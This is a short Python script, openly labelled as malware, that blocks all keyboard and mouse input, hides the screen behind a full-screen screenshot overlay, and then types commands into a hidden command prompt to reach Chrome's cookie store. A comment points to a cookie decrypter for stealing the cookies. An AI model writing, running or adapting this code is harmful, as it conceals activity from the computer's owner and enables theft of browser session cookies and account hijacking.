# ------------- # imports # ------------- #
import os
import time
import keyboard
import mouse
import pynput
import tkinter as tk
from PIL import ImageGrab, ImageTk

# ------------- # Settings # ------------- #
HIDE_FROM_USER = 1

# ------------- # Main Window init # ------------- #
window = tk.Tk()

# ------------- # block user input # ------------- #
mouse_listener = pynput.mouse.Listener(suppress=True)
mouse.move(window.winfo_screenwidth(),window.winfo_screenheight(), absolute=True, duration=0)
mouse_listener.start()
for i in range (0,255):
    keyboard.block_key(i)

# ------------- # block screen from view # ------------- #
background_label = tk.Label(window)
temp_path = "./temp/some_image.png"
im = ImageGrab.grab()
im.save(temp_path)
load_for_label = ImageTk.PhotoImage(file=temp_path)
background_label.config(image=load_for_label)

window.clipboard_clear()
os.remove(temp_path)

background_label.place(x=0, y=0, relwidth=1, relheight=1)
window.configure(bg="black")
window.overrideredirect(True)
window.geometry(f"{window.winfo_screenwidth()}x{window.winfo_screenheight()}")
window.wm_attributes("-topmost", True)
if HIDE_FROM_USER:
    window.update()

# ------------- # run malware # ------------- #
keyboard.press_and_release("win+r")
time.sleep(.1)
keyboard.write("cmd")
time.sleep(.1)
keyboard.press_and_release("enter")
time.sleep(.5)

keyboard.write("cd /")
keyboard.press_and_release("enter")
time.sleep(.5)

keyboard.write("cd C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
keyboard.press_and_release("enter")
# use a decrypter like https://github.com/illera88/GCC-stealer/blob/master/src/GCC-stealer.cpp
time.sleep(.5)

keyboard.write("dir")
keyboard.press_and_release("enter")
time.sleep(.5)

keyboard.press_and_release("alt+f4")
time.sleep(.5)

# ------------- # un-block user input # ------------- #
for i in range (0,255):
    keyboard.unblock_key(i)
mouse_listener.stop()